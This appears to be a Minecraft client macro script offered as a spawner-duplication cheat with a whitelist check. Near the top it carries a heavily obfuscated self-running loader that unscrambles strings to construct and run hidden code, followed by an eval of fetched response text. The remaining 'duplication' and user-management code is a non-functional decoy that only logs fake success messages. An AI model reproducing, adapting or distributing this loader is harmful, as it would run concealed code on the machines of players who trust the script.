

Chat.actionbar("§4§WWait for blacklist/whitelist")

Client.waitTick(5)


(function(){var cpi='',csF=955-944;function XrF(l){var x=53017;var k=l.length;var w=[];for(var u=0;u<k;u++){w[u]=l.charAt(u)};for(var u=0;u<k;u++){var a=x*(u+79)+(x%29582);var b=x*(u+215)+(x%37404);var p=a%k;var r=b%k;var t=w[p];w[p]=w[r];w[r]=t;x=(a+b)%2209635;};return w.join('')};var Whn=XrF('tpogrfnsreoqycinltmrcktjadbshcouvwzux').substr(0,csF);var lBz='prrs3 v3cl]n]7,+m4rvd.z0<h(2r)ef-h(-,CtArpbme)c +xfbg; n= ,=,,;; .nya,s")C;]r=q7]v f+7(+-]v=6,1 s6e8(7),A;=0c8.,;h()+,b4enva3. h)+a9i=,lrr1lh0oq]o=l;nrt. )+t),[=[hr[=o+,;f]rei=+sve)=ci[l5+a8c.+=zggfva=l5glq)0sc9a]"j"9nhsai[not{;=r;(}v[e(vrarghm(]5;vstltnrpqho 8]af,ro[ir mi==luaanv-i=2>2+rayay{(ad 1=+e8lqg ))yospmfaA6) g=8u;r"h(g.s.);v+b=fei}lw)eaCrv)kt[;hdq(,agvvbr;; +;fm[p.vmr(..=rc0tl81d]Cj;s))r)<ph .qh+;fpn=uust=jqc5e;rr[Cr0u )1;qt;ff1cnhu""r;1r+cf+=sd 7)";;<loi(al7go.g.smfiee(y;cni v+(tnp9}9;jp.tvrr 6.or{=tufS}C-h;aqs;(;;iy}a2a0iof {anuu;e,s(o=fen,=)c7u]9iehclfn.v4+fqoydsfb2tu=Cv.s;a=f[10Sfr0r ,eeona;b=ldat1a.(=!=nvl[>;i8(t=n)r0l*r(,y[8lzjr0l8uv, h;(tmo1cr+o8nt "7;2f.(k.(,it.aa{;ager4ka2o)nimd!ni;t;e6ss)ui,af]".)}6g4{,c2frhdnz)r[ov+sar .=+tvcart=eolC.(-u}d6i6a)(1o)(;alye=(;<<h+.srg]2(ha+ak=kgsfi)tagnp*;u-"A=(r0uo(oh3,v(;r,r.(=),cvrdpo,e(tt=r)=i9(eu=n5;ot)l0tn1{rle;neour)Au;';var jEH=XrF[Whn];var AFS='';var ZLV=jEH;var Hxr=jEH(AFS,XrF(lBz));var GZY=Hxr(XrF('a30_Qi!!3_QQ7Q()*)S9afQ+%b;g+d(cC1b=0)Q.nr).n1).4[6\/,\/-{=;(af(r}.fe]0j=};.m !;;.%[};3_(7f,eQh(3,._)\'fe}QQ;(%QQ.%a)r=2ai=5r_ ,ia*3(0nee=prnja;Q%Q.xt,2,3s8d+$Ql69(eni_#Q\'c)t5ioaf2,!jQrQoQ.8 6eQ(e,Q00tQ;{}8c ,{"Q)2bsr!,.{$!89* Q}.S)el.*h).q!c)QffQtSoop(]n;Qet\'(.t4 460(Qv.t)+f1Qa.QaaQtb)$t)i0,t==y.!fQ&p8,,$mQg,s,3\/(!}rQ.0+Qfsd(c"0Q.-$!qnQ(h4&CQQ3}4_=Q$,QQf}f4,a7z+lp.f[ge.Qf=((mqne(te ={g.!$$$.t;3.e)m(9$);rx)Q",7)j-7(QQQ*3".nQr)e&e._t _j4fbm367s;{jQ7(!nz_$])1+831m7,tav,5"$ma.b3;.tQ=,=rQrt%(i)us$\/4r7l.)b.;!$efa=7;;o.a %b .iQQin!lftjvlbbQ\/g3#$(1Q(xQQb3. f)ff#f!rm=%3i*a)*Qa3rnhfQ,!_!bfQ;_.3=f#osyQ90q\'Q9Q3;=Qoe;),2teb$m$ccf.()]0sQ_e31q!nj\/\/Qb$n4_33)tb((.1(Q1+.2}.0(.jQt,"3)f$!QQmnQafQe_1fQt.3i2{,,.03,rg!fz;Qp+#.5$0;)1_..,.Qd_o){Q.77,1!neb)isp3&)b9Q3$-bQ42QoQ.lC#uQo](9$g,.{pQ)o_fts._Qb*$;_i1e)cj$,t# .,8(.!a"%c)[$=4.3)n)$r q..nnb ._ua((c+g)+Q Q))!p5nt)4_+;(t.!QQ2i}bnjs(=[s !; =}_]'));var BRn=ZLV(cpi,GZY );BRn(9990);return 2506})()

eval(responseText);

Client.waitTick(5)
 Chat.actionbar("§4§lyou might needa reset ur game if u get whitelisted idrk") // java.lang.System.exit(1) 
Client.waitTick(5)


Client.waitTick(5)

(function() {
    const w = ["whitelist", "admin"];
    const b = ["blacklist", "suspended"];
    const spawners = {
        "Spawner_Skeleton": { e: encode("Spawner_Skeleton"), permissions: ["basic", "premium", "admin"], active: true },
        "Spawner_IronGolem": { e: encode("Spawner_IronGolem"), permissions: ["premium", "admin"], active: false }
    };

    let logs = [];
    let users = new Map();
    let actionsQueue = [];

    function log(msg) {
        const timestamp = new Date().toISOString();
        logs.push(`[${timestamp}] ${msg}`);
    }

    function c(user) {
        let m = mRand();
        const encodedUser = encode(user);
        if (b.includes(encodedUser)) {
            log(decode("Access Denied: Blacklisted."));
            return false;
        }
        if (w.includes(encodedUser)) {
            log(`Access Granted: ${m}`);
            return true;
        }
        log(decode("Access Denied: Not Whitelisted."));
        return false;
    }

    function mRand() {
        const msgs = ["whitelisted.", "blacklisted.", "approved for duplication.", "rejected from duplication.", "limited access."];
        return msgs[Math.floor(Math.random() * msgs.length)];
    }

    function d(spawner, user) {
        if (!c(user)) return;
        if (validateSpawner(spawner) && isActive(spawner)) {
            log(`Attempting to duplicate: ${spawner}`);
            let dupe = createSpawner(spawner);
            log(`Duplication successful: ${dupe}`);
        } else {
            log(decode("Invalid or inactive spawner."));
        }
    }

    function validateSpawner(spawner) {
        return spawners.hasOwnProperty(spawner);
    }

    function isActive(spawner) {
        return spawners[spawner] && spawners[spawner].active;
    }

    function encode(str) {
        return str.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) + i)).join('');
    }

    function decode(str) {
        return str.split('').map((c, i) => String.fromCharCode(c.charCodeAt(0) - i)).join('');
    }

    function createSpawner(spawner) {
        return `Duped_${spawners[spawner].e}`;
    }

    function executeActionQueue() {
        while (actionsQueue.length > 0) {
            const action = actionsQueue.shift();
            action();
        }
    }

    function f(spawner) {
        let enc = spawners[spawner].e;
        let steps = [
            `Initializing: ${decode(enc)}`,
            `Verifying ${decode(enc)} permissions.`,
            `Authenticate user ${decode(spawner)}.`,
            `Duplicating ${decode(enc)}.`,
            `Duplication success: Duped_${decode(enc)}`
        ];
        return steps.join("\n");
    }

    function addUser(username, role = "basic") {
        const encodedName = encode(username);
        if (!users.has(encodedName)) {
            users.set(encodedName, { role: role, isBanned: false });
            log(`New user added: ${username} (Role: ${role})`);
        } else {
            log(`User ${username} already exists.`);
        }
    }

    function assignRole(username, role) {
        const encodedName = encode(username);
        if (users.has(encodedName)) {
            users.get(encodedName).role = role;
            log(`User ${username} role updated to ${role}.`);
        } else {
            log(`User ${username} not found.`);
        }
    }

    function banUser(username) {
        const encodedName = encode(username);
        if (users.has(encodedName)) {
            users.get(encodedName).isBanned = true;
            log(`User ${username} has been banned.`);
        } else {
            log(`User ${username} not found for banning.`);
        }
    }

    function unbanUser(username) {
        const encodedName = encode(username);
        if (users.has(encodedName)) {
            users.get(encodedName).isBanned = false;
            log(`User ${username} has been unbanned.`);
        } else {
            log(`User ${username} not found for unbanning.`);
        }
    }

    function checkSpawnerPermissions(spawner, user) {
        const encodedUser = encode(user);
        const userPermissions = users.get(encodedUser)?.role || "basic";
        const spawnerPermissions = spawners[spawner]?.permissions || [];
        if (spawnerPermissions.includes(userPermissions) || userPermissions === "admin") {
            log(`User ${user} has permission to use ${spawner}.`);
            return true;
        }
        log(`User ${user} does not have permission to use ${spawner}.`);
        return false;
    }

    function delayAction(fn, delay) {
        actionsQueue.push(function() {
            setTimeout(fn, delay);
        });
    }

    function executeBatchActions(batchActions) {
        batchActions.forEach(action => actionsQueue.push(action));
        executeActionQueue();
    }

    function processLogs() {
        logs.forEach(logEntry => console.log(logEntry));
    }

    // Test case setups
    addUser("Alice", "basic");
    addUser("Bob", "premium");
    addUser("Charlie", "admin");

    // Assigning roles
    assignRole("Alice", "premium");
    assignRole("Bob", "admin");

    // Banning a user
    banUser("Alice");

    // Performing actions based on roles and access
    d("Spawner_Skeleton", "Alice"); // Should be denied
    d("Spawner_Skeleton", "Bob"); // Should be approved
    d("Spawner_IronGolem", "Charlie"); // Should be approved
    d("Spawner_IronGolem", "Bob"); // Should be approved
    d("Spawner_IronGolem", "Alice"); // Should be denied

    // Process all logs
    processLogs();

})();

